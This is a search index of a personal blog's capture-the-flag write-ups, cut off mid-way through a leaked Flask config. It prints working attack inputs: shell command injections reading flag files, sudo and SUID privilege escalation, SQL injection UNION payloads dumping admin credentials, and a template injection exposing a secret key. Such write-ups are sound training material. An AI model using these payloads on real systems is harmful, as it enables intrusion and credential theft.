{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome!","text":"<p>I will put here all my write ups from TryHackMe, HackTheBox, CTFs... If you want more, I have this repository with useful information that I have been collecting while I learn.</p> <p>Also, I would like to invite you to  Raptor Blog. There, I will post cool articles about cybsersecurity like, how to perform certain attacks or speaking about cool tools that can be used for certain tasks, and also I would write about personal projects I make in my free time.</p>"},{"location":"#a-bit-about-me","title":"A bit about me","text":"<p>Hello I am \u00c1ngel! I studied Computer Science Engineering at C\u00f3rdoba University where I had the pleasure of being part of the Free Software Group, possibly the best thing I have done in my degree. I'm really passionate about cybersecurity and I love spending time with challenges in HackTheBox, playing CTFs and also playing with things related to infrastructure.</p> <p> </p>"},{"location":"CTFs/","title":"CTFs","text":"<p>Cybersecurity capture the flag competitions where the participants will try to solve different challenges in teams or by themselves. A cool site to get information about upcoming events is CTFtime.</p> <p> </p>"},{"location":"CTFs/DEADFACE_CTF_2021/","title":"DEADFACE CTF 2021","text":"<p>Cyber Hacktics and CyberUp will once again be hosting a CTF in support of National Cyber Security Awareness Month! Formerly Hacktober CTF, the title of this year's CTF is DEADFACE CTF. Competitors will play on teams of up to four players to take on DEADFACE, the notorious hacker group featured in last year's event.</p> <p> </p>"},{"location":"CTFs/DEADFACE_CTF_2021/Blood_Bash_3/","title":"Blood Bash 3","text":""},{"location":"CTFs/DEADFACE_CTF_2021/Blood_Bash_3/#enumeration","title":"Enumeration","text":"<p>The challenge says that this flag is not in a normal file so I started looking around for programs or something similar. I found this: <pre><code>bl0ody_mary@961430c4b52e:~$ cat /opt/start.sh \n#!/bin/bash\n\nsudo /usr/sbin/srv &amp;\nexec /bin/bash\n</code></pre></p> <p>We can't read that <code>srv</code> program but I also saw this: <pre><code>bl0ody_mary@961430c4b52e:~$ sudo -l \nMatching Defaults entries for bl0ody_mary on 961430c4b52e:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser bl0ody_mary may run the following commands on 961430c4b52e:\n    (ALL) NOPASSWD: /opt/start.sh, /usr/sbin/srv\n</code></pre></p>"},{"location":"CTFs/DEADFACE_CTF_2021/Blood_Bash_3/#we-are-root","title":"We are root!","text":"<p>Since we can use <code>sudo</code> to execute that start thing we can get a root shell simply by executing it: <pre><code>bl0ody_mary@961430c4b52e:~$ sudo /opt/start.sh \nroot@961430c4b52e:/home/bl0ody_mary# Traceback (most recent call last):\n  File \"/usr/sbin/srv\", line 14, in &lt;module&gt;\n    udp_server_socket.bind((host, port))\nOSError: [Errno 98] Address already in use\n\nroot@961430c4b52e:/home/bl0ody_mary#\n</code></pre></p> <p>Looks like that <code>srv</code> program is trying to bind to a port, let's check the program now: <pre><code>root@961430c4b52e:/home/bl0ody_mary# cat /usr/sbin/srv\n#!/usr/bin/env python3\n\nimport socket as s\nfrom binascii import hexlify as h, unhexlify as u\n\nhost = \"127.0.0.1\"\nport = 43526\nbuffer = 1024\n\nmsg = b\"666c61677b6f70656e5f706f727428616c29737d\"\nbytes_to_send = u(msg)\n\nudp_server_socket = s.socket(s.AF_INET, s.SOCK_DGRAM)\nudp_server_socket.bind((host, port))\n\nwhile True:\n        bytes_address_pair = udp_server_socket.recvfrom(buffer)\n        #message = bytes_address_pair[0]\n        address = bytes_address_pair[1]\n\n        udp_server_socket.sendto(bytes_to_send, address)\n</code></pre> So it is hosting an interesting UDP service in the port <code>43526</code>.</p>"},{"location":"CTFs/DEADFACE_CTF_2021/Blood_Bash_3/#a-flag","title":"A flag!","text":"<p>Connecting to the service with netcat and pressing enter gives the flag: <pre><code>root@961430c4b52e:/home/bl0ody_mary# nc -u 127.0.0.1 43526\n\nflag{open_port(al)s}\n</code></pre></p>"},{"location":"CTFs/DEADFACE_CTF_2021/Cereal_Killer/","title":"Cereal Killer","text":"<p>Using <code>strings</code> with the binary I noticed a weird string near the part where the program asks for a password: <code>c0unt-ch0cula</code>. Using it as the password that program is asking for will do! <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/CTF/Deadface2021/Cereal Killer]\n\u2514\u2500$ ./deadface_re01.bin                  \nWhat is the best and sp00kiest breakfast cereal?\nPlease enter the passphrase: c0unt-ch0cula\nflag{c0unt-ch0cula-cereal-FTW}\n</code></pre></p>"},{"location":"CTFs/DEADFACE_CTF_2021/File_101/","title":"File 101","text":""},{"location":"CTFs/DEADFACE_CTF_2021/File_101/#all-started-with-an-image","title":"All started with an image","text":"<p>The challenge gives an image to start with. Searching in it we found a trailing string that was a link to a file in dropbox.</p>"},{"location":"CTFs/DEADFACE_CTF_2021/File_101/#a-protected-zip-file","title":"A protected zip file","text":"<p>The file we got from that dropbox link is a protected zip. After a while we decided to throw John the ripper with the Rockyou dictionary and it worked! Now we have a corrupted file, let's continue.</p>"},{"location":"CTFs/DEADFACE_CTF_2021/File_101/#fixing-things-up","title":"Fixing things up","text":"<p>Looking at the file magic bits we can see that is probably a jpeg image. Fixing the header allow us to open the image and get the flag:</p> <pre><code>flag{Easy_Right}\n</code></pre>"},{"location":"CTFs/DEADFACE_CTF_2021/Old_Devil/","title":"Old Devil","text":""},{"location":"CTFs/DEADFACE_CTF_2021/Old_Devil/#analysis","title":"Analysis","text":"<p>After a while looking aroung in Ghidra, I found that the 'Demon name' that the programs asks for is generated before asking for it. Using Radare (Yeah Im one of those) I can set a breakpoint in the program and check the stack to read it:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Downloads]\n\u2514\u2500$ r2 -d ./demon\nProcess with PID 14834 started...\n= attach 14834 14834\nbin.baddr 0x56412de10000\nUsing 0x56412de10000\nasm.bits 64\n[0x7fdf8f579050]&gt; aa\n[x] Analyze all flags starting with sym. and entry0 (aa)\n[0x7fdf8f579050]&gt; aa\n[x] Analyze all flags starting with sym. and entry0 (aa)\n[0x7fdf8f579050]&gt; pdf@main\n            ; DATA XREF from entry0 @ 0x56412de1109d\n\u250c 304: int main (int argc, char **argv, char **envp);\n\u2502           ; var int64_t var_50h @ rbp-0x50\n\u2502           ; var int64_t var_3fh @ rbp-0x3f\n\u2502           ; var int64_t var_3bh @ rbp-0x3b\n\u2502           ; var int64_t var_30h @ rbp-0x30\n\u2502           ; var int64_t var_2fh @ rbp-0x2f\n\u2502           ; var int64_t var_20h @ rbp-0x20\n\u2502           ; var int64_t var_18h @ rbp-0x18\n\u2502           ; var int64_t var_ch @ rbp-0xc\n\u2502           ; var int64_t var_8h @ rbp-0x8\n\u2502           ; var int64_t var_1h @ rbp-0x1\n\u2502           0x56412de11165      55             push rbp\n\u2502           0x56412de11166      4889e5         mov rbp, rsp\n\u2502           0x56412de11169      4883ec50       sub rsp, 0x50\n\u2502           0x56412de1116d      c645ff4e       mov byte [var_1h], 0x4e ; 'N' ; 78\n\u2502           0x56412de11171      488d05900e00.  lea rax, [0x56412de12008]\n\u2502           0x56412de11178      488945e8       mov qword [var_18h], rax\n\u2502           0x56412de1117c      488d05920e00.  lea rax, str.kaljvLi    ; 0x56412de12015 ; \"kaljvLi\\x7fl@@ha&gt;nep\"\n\u2502           0x56412de11183      488945e0       mov qword [var_20h], rax\n\u2502           0x56412de11187      c745f8000000.  mov dword [var_8h], 0\n\u2502       \u250c\u2500&lt; 0x56412de1118e      eb36           jmp 0x56412de111c6\n\u2502      \u250c\u2500\u2500&gt; 0x56412de11190      8b45f8         mov eax, dword [var_8h]\n\u2502      \u254e\u2502   0x56412de11193      4863d0         movsxd rdx, eax\n\u2502      \u254e\u2502   0x56412de11196      488b45e0       mov rax, qword [var_20h]\n\u2502      \u254e\u2502   0x56412de1119a      4801d0         add rax, rdx\n\u2502      \u254e\u2502   0x56412de1119d      0fb600         movzx eax, byte [rax]\n\u2502      \u254e\u2502   0x56412de111a0      84c0           test al, al\n\u2502     \u250c\u2500\u2500\u2500&lt; 0x56412de111a2      741e           je 0x56412de111c2\n\u2502     \u2502\u254e\u2502   0x56412de111a4      8b45f8         mov eax, dword [var_8h]\n\u2502     \u2502\u254e\u2502   0x56412de111a7      4863d0         movsxd rdx, eax\n\u2502     \u2502\u254e\u2502   0x56412de111aa      488b45e0       mov rax, qword [var_20h]\n\u2502     \u2502\u254e\u2502   0x56412de111ae      4801d0         add rax, rdx\n\u2502     \u2502\u254e\u2502   0x56412de111b1      0fb600         movzx eax, byte [rax]\n\u2502     \u2502\u254e\u2502   0x56412de111b4      83f00d         xor eax, 0xd            ; 13\n\u2502     \u2502\u254e\u2502   0x56412de111b7      89c2           mov edx, eax\n\u2502     \u2502\u254e\u2502   0x56412de111b9      8b45f8         mov eax, dword [var_8h]\n\u2502     \u2502\u254e\u2502   0x56412de111bc      4898           cdqe\n\u2502     \u2502\u254e\u2502   0x56412de111be      885405b0       mov byte [rbp + rax - 0x50], dl\n\u2502     \u2514\u2500\u2500\u2500&gt; 0x56412de111c2      8345f801       add dword [var_8h], 1\n\u2502      \u254e\u2502   ; CODE XREF from main @ 0x56412de1118e\n\u2502      \u254e\u2514\u2500&gt; 0x56412de111c6      837df811       cmp dword [var_8h], 0x11\n\u2502      \u2514\u2500\u2500&lt; 0x56412de111ca      7ec4           jle 0x56412de11190\n\u2502           0x56412de111cc      c645c100       mov byte [var_3fh], 0\n\u2502           0x56412de111d0      c745f4000000.  mov dword [var_ch], 0\n\u2502       \u250c\u2500&lt; 0x56412de111d7      eb36           jmp 0x56412de1120f\n\u2502      \u250c\u2500\u2500&gt; 0x56412de111d9      8b45f4         mov eax, dword [var_ch]\n\u2502      \u254e\u2502   0x56412de111dc      4863d0         movsxd rdx, eax\n\u2502      \u254e\u2502   0x56412de111df      488b45e8       mov rax, qword [var_18h]\n\u2502      \u254e\u2502   0x56412de111e3      4801d0         add rax, rdx\n\u2502      \u254e\u2502   0x56412de111e6      0fb600         movzx eax, byte [rax]\n\u2502      \u254e\u2502   0x56412de111e9      84c0           test al, al\n\u2502     \u250c\u2500\u2500\u2500&lt; 0x56412de111eb      741e           je 0x56412de1120b\n\u2502     \u2502\u254e\u2502   0x56412de111ed      8b45f4         mov eax, dword [var_ch]\n\u2502     \u2502\u254e\u2502   0x56412de111f0      4863d0         movsxd rdx, eax\n\u2502     \u2502\u254e\u2502   0x56412de111f3      488b45e8       mov rax, qword [var_18h]\n\u2502     \u2502\u254e\u2502   0x56412de111f7      4801d0         add rax, rdx\n\u2502     \u2502\u254e\u2502   0x56412de111fa      0fb600         movzx eax, byte [rax]\n\u2502     \u2502\u254e\u2502   0x56412de111fd      83f00d         xor eax, 0xd            ; 13\n\u2502     \u2502\u254e\u2502   0x56412de11200      89c2           mov edx, eax\n\u2502     \u2502\u254e\u2502   0x56412de11202      8b45f4         mov eax, dword [var_ch]\n\u2502     \u2502\u254e\u2502   0x56412de11205      4898           cdqe\n\u2502     \u2502\u254e\u2502   0x56412de11207      885405c5       mov byte [rbp + rax - 0x3b], dl\n\u2502     \u2514\u2500\u2500\u2500&gt; 0x56412de1120b      8345f401       add dword [var_ch], 1\n\u2502      \u254e\u2502   ; CODE XREF from main @ 0x56412de111d7\n\u2502      \u254e\u2514\u2500&gt; 0x56412de1120f      837df40a       cmp dword [var_ch], 0xa\n\u2502      \u2514\u2500\u2500&lt; 0x56412de11213      7ec4           jle 0x56412de111d9\n\u2502           0x56412de11215      c645d000       mov byte [var_30h], 0\n\u2502           0x56412de11219      488d3d080e00.  lea rdi, str._nLuciafer_v1.0_nSay_the_demons_name_to_gain_access_to_the_secret. ; 0x56412de12028 ; \"\\nLuciafer v1.0\\nSay the demon's name to gain access to the secret.\"                                                                                                                                           \n\u2502           0x56412de11220      e80bfeffff     call sym.imp.puts       ; int puts(const char *s)\n\u2502           0x56412de11225      488d3d3e0e00.  lea rdi, str.Enter_the_demons_name:_ ; 0x56412de1206a ; \"Enter the demon's name: \"\n\u2502           0x56412de1122c      b800000000     mov eax, 0\n\u2502           0x56412de11231      e80afeffff     call sym.imp.printf     ; int printf(const char *format)\n\u2502           0x56412de11236      488d45d1       lea rax, [var_2fh]\n\u2502           0x56412de1123a      4889c7         mov rdi, rax\n\u2502           0x56412de1123d      b800000000     mov eax, 0\n\u2502           0x56412de11242      e819feffff     call sym.imp.gets       ; char *gets(char *s)\n\u2502           0x56412de11247      488d55c5       lea rdx, [var_3bh]\n\u2502           0x56412de1124b      488d45d1       lea rax, [var_2fh]\n\u2502           0x56412de1124f      4889d6         mov rsi, rdx\n\u2502           0x56412de11252      4889c7         mov rdi, rax\n\u2502           0x56412de11255      e8f6fdffff     call sym.imp.strcmp     ; int strcmp(const char *s1, const char *s2)\n\u2502           0x56412de1125a      85c0           test eax, eax\n\u2502       \u250c\u2500&lt; 0x56412de1125c      740e           je 0x56412de1126c\n\u2502       \u2502   0x56412de1125e      488d3d230e00.  lea rdi, str._nThat_is_not_the_demons_name. ; 0x56412de12088 ; \"\\nThat is not the demon's name.\"\n\u2502       \u2502   0x56412de11265      e8c6fdffff     call sym.imp.puts       ; int puts(const char *s)\n\u2502      \u250c\u2500\u2500&lt; 0x56412de1126a      eb10           jmp 0x56412de1127c\n\u2502      \u2502\u2514\u2500&gt; 0x56412de1126c      488d3d340e00.  lea rdi, str._nYou_are_correct. ; 0x56412de120a7 ; \"\\nYou are correct.\"\n\u2502      \u2502    0x56412de11273      e8b8fdffff     call sym.imp.puts       ; int puts(const char *s)\n\u2502      \u2502    0x56412de11278      c645ff59       mov byte [var_1h], 0x59 ; 'Y' ; 89\n\u2502      \u2502    ; CODE XREF from main @ 0x56412de1126a\n\u2502      \u2514\u2500\u2500&gt; 0x56412de1127c      807dff4e       cmp byte [var_1h], 0x4e\n\u2502       \u250c\u2500&lt; 0x56412de11280      740c           je 0x56412de1128e\n\u2502       \u2502   0x56412de11282      488d45b0       lea rax, [var_50h]\n\u2502       \u2502   0x56412de11286      4889c7         mov rdi, rax\n\u2502       \u2502   0x56412de11289      e8a2fdffff     call sym.imp.puts       ; int puts(const char *s)\n\u2502       \u2514\u2500&gt; 0x56412de1128e      b800000000     mov eax, 0\n\u2502           0x56412de11293      c9             leave\n\u2514           0x56412de11294      c3             ret\n[0x7fdf8f579050]&gt; db 0x56412de11219\n[0x7fdf8f579050]&gt; dc\n[+] SIGNAL 28 errno=0 addr=0x00000000 code=128 si_pid=0 ret=0\n[0x7fdf8f579050]&gt; dc\nhit breakpoint at: 0x56412de11219\n[0x56412de11219]&gt; px @ rbp-0x3b\n- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0x7ffd70c20e65  4164 7261 6d6d 656c 6563 6800 0000 0000  Adrammelech.....                                                                                                                                     \n0x7ffd70c20e75  0000 0000 0000 0000 0000 0015 20e1 2d41  ............ .-A\n0x7ffd70c20e85  5600 0008 20e1 2d41 5600 0090 0fc2 700b  V... .-AV.....p.\n0x7ffd70c20e95  0000 0012 0000 0000 0000 4ea0 12e1 2d41  ..........N...-A\n0x7ffd70c20ea5  5600 004a ee3b 8fdf 7f00 0098 0fc2 70fd  V..J.;........p.\n0x7ffd70c20eb5  7f00 007f ec3b 8f01 0000 0065 11e1 2d41  .....;.....e..-A\n0x7ffd70c20ec5  5600 0000 0000 0008 0000 0000 0000 0000  V...............\n0x7ffd70c20ed5  0000 008c c84a 5f97 a5a4 6b80 10e1 2d41  .....J_...k...-A\n0x7ffd70c20ee5  5600 0000 0000 0000 0000 0000 0000 0000  V...............\n0x7ffd70c20ef5  0000 0000 0000 0000 0000 008c c86a 67d1  .............jg.\n0x7ffd70c20f05  1fdc 388c c80c a622 e099 3800 0000 0000  ..8....\"..8.....\n0x7ffd70c20f15  0000 0000 0000 0000 0000 0000 0000 0000  ................\n0x7ffd70c20f25  0000 0001 0000 0000 0000 0098 0fc2 70fd  ..............p.\n0x7ffd70c20f35  7f00 00a8 0fc2 70fd 7f00 00e0 415a 8fdf  ......p.....AZ..\n0x7ffd70c20f45  7f00 0000 0000 0000 0000 0000 0000 0000  ................\n0x7ffd70c20f55  0000 0080 10e1 2d41 5600 0090 0fc2 70fd  ......-AV.....p.\n</code></pre> <p>An there it is that 'Demon name', <code>Adrammelech</code>.</p>"},{"location":"CTFs/DEADFACE_CTF_2021/Old_Devil/#give-me-the-flag","title":"Give me the flag!","text":"<p>To get the flag just use <code>Adrammelech</code> as the answer to the program question: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Downloads]\n\u2514\u2500$ ./demon            \n\nLuciafer v1.0\nSay the demon's name to gain access to the secret.\nEnter the demon's name: Adrammelech\n\nYou are correct.\nflag{AdraMMel3ch}\n</code></pre></p>"},{"location":"CTFs/DEADFACE_CTF_2021/The_Count/","title":"The Count","text":""},{"location":"CTFs/DEADFACE_CTF_2021/The_Count/#enumeration","title":"Enumeration","text":"<p>Trying to connect to the service provided by the challenge will ask for the sum of a word: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc code.deadface.io 50000\nDEADFACE gatekeeper: Let us see how good your programming skills are.\nIf a = 0, b = 1, c = 2, etc.. Tell me what the sum of this word is:\n\n You have 5 seconds to give me an answer.\n\nYour word is: classy\nToo slow!! Word has been reset!\n</code></pre></p> <p>With only 5 seconds it is pretty hard to do by hand so Python time!</p>"},{"location":"CTFs/DEADFACE_CTF_2021/The_Count/#python-knows-best","title":"Python knows best","text":"<p>I went for <code>pwntools</code> because it is an easy to use Python framework for this kind of things. We have to connect to the service, get the word and then calculate the sum of its letters. Using <code>string.ascii_lowercase</code> we can get a lower case alphabet string that we can use with the <code>find</code> function to get the values of every letter.</p> <p>Translating all of the above to Python code, this is the result: <pre><code>#! /usr/bin/env python3\n\nfrom pwn import *\nimport string\n\n\nalphabet = string.ascii_lowercase\n\nchallenge = remote('code.deadface.io', 50000)\nchallenge.recvuntil('Your word is: ')\nword = challenge.recv().decode().strip()\n\nprint(f'The word is --&gt; {word}')\nword_sum = 0\nfor letter in word:\n    word_sum += alphabet.find(letter)\nprint(f'Its value is --&gt; {word_sum}')\n\nchallenge.send(str(word_sum))\nflag = challenge.recv().decode().strip()\nprint(f'Flag --&gt; {flag}')\n\nchallenge.close()\n</code></pre></p> <p>Executing the code will give the flag: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/TODO/The Count]\n\u2514\u2500$ ./get_flag.py     \n[+] Opening connection to code.deadface.io on port 50000: Done\nThe word is --&gt; humor\nIts value is --&gt; 70\nFlag --&gt; flag{d1c037808d23acd0dc0e3b897f344571ddce4b294e742b434888b3d9f69d9944}\n[*] Closed connection to code.deadface.io port 50000\n</code></pre></p>"},{"location":"CTFs/DEADFACE_CTF_2021/The_Root_of_All_Evil/","title":"The Root of All Evil","text":""},{"location":"CTFs/DEADFACE_CTF_2021/The_Root_of_All_Evil/#first-things-first","title":"First things first...","text":"<p>I tried to connect to the host but it just rejected the conection asking for a private key. </p>"},{"location":"CTFs/DEADFACE_CTF_2021/The_Root_of_All_Evil/#getting-access","title":"Getting access","text":"<p>The challenge gives a <code>pcap</code> file to use so I guess that somewhere in there should be a private key. Searching in the <code>pcap</code> file for the string <code>private</code> in the packets data part revealed the Luciafer private key!</p>"},{"location":"CTFs/DEADFACE_CTF_2021/The_Root_of_All_Evil/#give-me-my-flag","title":"Give me my flag!","text":"<p>We can now connect to the machine and get the flag under <code>/home/luciafer/Downloads/flag.txt</code>:</p> <pre><code>flag{Lucy-a-FUR-G0T-R3KT-by-the-BLUZers-CLUB!!!}\n</code></pre>"},{"location":"CTFs/H%40cktivityCon_2021/","title":"H@cktivityCon 2021","text":"<p>H@cktivityCon is a HackerOne hosted hacker conference built by the community for the community. After a successful inaugural H@cktivityCon 2020 with over 12000 registrants.</p> <p> </p>"},{"location":"CTFs/H%40cktivityCon_2021/Bad_Words/","title":"Bad Words","text":"<p>Adding a <code>\\</code> to every command to scape the first letter allow us to use all the bash commands we want. That way we can just get the flag:</p> <p><code>flag{2d43e30a358d3f30fe65cc47a9cbbe98}</code></p>"},{"location":"CTFs/H%40cktivityCon_2021/ButterOverflow/","title":"ButterOverflow","text":"<p>Checking the code we can see that if the a buffer overflow exception occur the program will print the flag. Since the buffer allocated is 512 bytes long and is using the <code>gets</code> function to get the data for it we can easily insert for example 600 bytes and get the flag:</p> <p><code>flag{72d8784a5da3a8f56d2106c12dbab989}</code></p>"},{"location":"CTFs/H%40cktivityCon_2021/Confidentiality/","title":"Confidentiality","text":"<p>The application is just using the user input with the <code>ls</code> command so we can just use <code>;cat flag.txt</code> to print the flag:</p> <p><code>flag{e56abbce7b83d62dac05e59fb1e81c68}</code></p>"},{"location":"CTFs/H%40cktivityCon_2021/N1P/","title":"N1P","text":"<p>After tryng the program a bit I noticed that using <code>flag{</code> as input the first part of the new encrypted text and the encrypted flag was the same. I coded a program that will try every possible combination of characters position by position calculating which of the character produce the best output:</p> <pre><code>#!/usr/bin/env python3\n\nfrom pwn import *\n\nconnection = remote('challenge.ctf.games',31921)\n\ndef get_guess_fitness(encrypted_flag: str, guessed_flag: str):\n    mathing_characters = 0\n    for encrypted_flag_character, guessed_flag_character in zip(encrypted_flag, guessed_flag):\n        if(encrypted_flag_character == guessed_flag_character):\n            mathing_characters +=  1\n        else:\n            break\n\n    return mathing_characters / len(encrypted_flag)\n\n\nwith log.progress('Getting encrypted flag...') as p:\n    connection.recvline('NINA: Hello! I found a flag, look!')\n    encrypted_flag = connection.recvline().decode().strip()\n\nwith log.progress('Guessing flag...') as p:\n    flag_guess = ''\n    current_fitness = 0;\n    alphabet = list(string.printable)[:-6]\n\n    while current_fitness != 1:\n        new_character = ''\n\n        for character in alphabet:\n            p.status(flag_guess + character)\n            connection.recv()\n            connection.send(flag_guess + character)\n            connection.recvline(\"\"\"connection.recvline('NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?')\"\"\")\n\n            encrypted_guess = connection.recvline().decode().strip()\n            new_fitness = get_guess_fitness(encrypted_flag, encrypted_guess)\n            if(new_fitness &gt; current_fitness):\n                new_character = character\n                current_fitness = new_fitness\n\n        flag_guess += new_character\n\n    p.success(flag_guess)\n\nconnection.close()\n</code></pre> <p>Executing the program will give us the flag:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/CTF/Hacktivity/N1P]\n\u2514\u2500$ ./flag_guesser.py\n[+] Opening connection to challenge.ctf.games on port 31921: Done\n[+] Getting encrypted flag...: Done\n[+] Guessing flag...: flag{9276cdb76a3dd6b1f523209cd9c0a11b}\n[*] Closed connection to challenge.ctf.games port 31921\n</code></pre>"},{"location":"CTFs/HacktoberCTF_2020/","title":"HacktoberCTF 2020","text":"<p>Hacktober CTF features jeopardy-style challenges and is hosted by Cyber Hacktics, CyberUp, and veterans of the United States Air Force in support of National Cyber Security Awareness Month.</p> <p> </p>"},{"location":"CTFs/HacktoberCTF_2020/PasswordCheck/","title":"PasswordCheck","text":"<p>Using the have i been pwned? API we wrote a program that will check every password hash provided and check how many times a certain password was compromised. After processing all the hashes, the program will check the most compromised hash and return the that hash and the number of times compromised.</p> <p>The program is this:</p> <pre><code>import requests\n\n\n# Read passwords hashes file\nfile = open(\"FL1R0jbn\", \"r\")\nlines = file.readlines()\nfile.close()\n\nhashes = []\n# Strips the newline character \nfor line in lines: \n    hashes.append(line.strip().upper())\n\nhost = \"https://api.pwnedpasswords.com/range/\"\npwnedTimes = []\nfor hash in hashes:\n    response = requests.get(f'{host}{hash[:5]}')\n    foundHashesSuffixes = response.content.splitlines()\n    found = False\n    for foundHashSuffix in foundHashesSuffixes:\n        if(hash[5:] in foundHashSuffix.decode()):\n            print(f\"Hash found! --&gt; {hash}\")\n            num = foundHashSuffix.decode().split(':')[1]\n            pwnedTimes.append(int(num))\n            found = True\n            break;\n    if not found:\n        pwnedTimes.append(0)\n\nmaxValue = max(pwnedTimes)\nmaxValueIndex = pwnedTimes.index(maxValue)\nprint(f'The most compromised password was compromised {maxValue} times')\nprint(f'The password hash is {hashes[maxValueIndex]}')\n</code></pre> <p>The output was:</p> <pre><code>Hash found! --&gt; C2577430D91716490DC5D33C20D901E008B696E7\nThe most compromised password was compromised 55001 times\nThe password hash is C2577430D91716490DC5D33C20D901E008B696E7\n</code></pre> <p>Using crackstation we got the plain text password: ncc1701 Therefore, the flag is:</p> <p><code>flag{55001_ncc1701}</code></p>"},{"location":"CTFs/HacktoberCTF_2020/TalkingToTheDead/","title":"TalkingToTheDead","text":""},{"location":"CTFs/HacktoberCTF_2020/TalkingToTheDead/#flag1-and-flag2","title":"Flag1 and Flag2","text":"<p>Basically flag1.txt and flag2.txt were in  luciafer documents. Just move to that folder and use <code>cat flag1.txt</code>: <pre><code>flag{cb07e9d6086d50ee11c0d968f1e5c4bf1c89418c}\n</code></pre> and <code>cat .flag2.txt</code>: <pre><code>flag{728ec98bfaa302b2dfc2f716d3de7869f3eadcbf}\n</code></pre></p>"},{"location":"CTFs/HacktoberCTF_2020/TalkingToTheDead/#flag3","title":"Flag3","text":"<p>Then looking for SUID bit files with <code>find / -perm /4000 2&gt; /dev/null</code> we found something funny: <code>/usr/local/bin/ouija</code></p> <p>That executable was owned by <code>root</code> and has the SUID bit set so it will be run as him. This executable will take the input and append <code>/root/</code> to it, basically to read a file from that folder. Using relatives paths we were able to read every file we want with it.</p> <p>Just use <code>ouija ../home/spookyboi/Documents/flag3.txt</code> and get your flag</p> <pre><code>flag{445b987b5b80e445c3147314dbfa71acd79c2b67}\n</code></pre>"},{"location":"CTFs/HacktoberCTF_2020/TalkingToTheDead/#flag4","title":"Flag4","text":"<p>Do you remember that <code>ouija</code> append the <code>/root/</code> string to our input? Well we tried <code>ouija flag4.txt</code> and the flag appeared</p> <pre><code>flag{4781cbffd13df6622565d45e790b4aac2a4054dc}\n</code></pre>"},{"location":"CTFs/Nahamcon_2021/","title":"Nahamcon 2021","text":"<p>Jeopardy style CTF from the developers of VirSecCon, NahamCon 2020, H@cktivityCon, BsidesBOS and GRIMMCon 0x3 CTF.</p> <p> </p>"},{"location":"CTFs/Nahamcon_2021/%24Echo/","title":"$Echo","text":"<p>The page looks like is passing our input to the <code>echo</code> command filtering some kind of characters. Looks like it wont parse ` so we can execute, for example, the <code>ls</code> command putting `ls`. Also we can use <code>&lt;</code> so we can tell bash to pass a file content to <code>echo</code>.</p> <p>Putting `ls ../` return <code>flag.txt html</code> as output, so there is the flag. Lets try this: <pre><code>`&lt;../flag.txt`\n</code></pre> And we get the flag:</p> <pre><code>flag{1beadaf44586ea4aba2ea9a00c5b6d91}\n</code></pre>"},{"location":"CTFs/Nahamcon_2021/AgentTesterV1/","title":"AgentTesterV1","text":"<p>The code of the aplication was provided and looking at the code we can see that is vulnerable to sql injection (Later i discovered that this wasnt really necessary because the tables names can be checked in the aplication files but hey, is cool):</p> <p><code>SELECT userAgent, url FROM uAgents WHERE userAgent = '%s'</code></p> <p>Lets get the tables names: <code>' UNION SELECT name, name FROM sqlite_master WHERE type='table' --</code> <code>' UNION SELECT name, name FROM sqlite_master WHERE type='table' and name!=\"uAgents\"--</code></p> <p>Table names: - uAgents - user</p> <p>The user table is what we want here i guess. Lets try this:</p> <p><code>' UNION SELECT username, password FROM user --</code></p> <p>And the page gave us: <code>Testing User-Agent: admin in url: *)(@skdnaj238374834**__**=</code> cool! So we now have the admin credentials:</p> <pre><code>admin:*)(@skdnaj238374834**__**=\n</code></pre> <p>Also we can use whatever endpoint and user agent we want:</p> <p><code>' UNION SELECT 'AgentTester v1','https://hookb.in/oXYJDgO6yzS1mmLaRZax' --</code></p> <p>Next, i noticed that the endpoint <code>/debug</code> exists (The challenge provided the code but im silly and didnt take a look until now). Looking at the app code, i noticed that it ask for a specific session ID, probably the admin user. I got the admin user so was not too hard to get access to it using Postman (Just copied the header <code>Cookie</code> from my browser to Postman). </p> <p>After some research, looks like we can inject flask under the key <code>code</code> with a POST form to the <code>/debug</code> endpoint. For example:</p> <pre><code>code:{{config}}\n\n&lt;Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': '1L5&amp;wnIh4!Rz6Ufo^iY?aRyV2qXM+kz5', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'auth', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite:///DB/db.sqlite', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 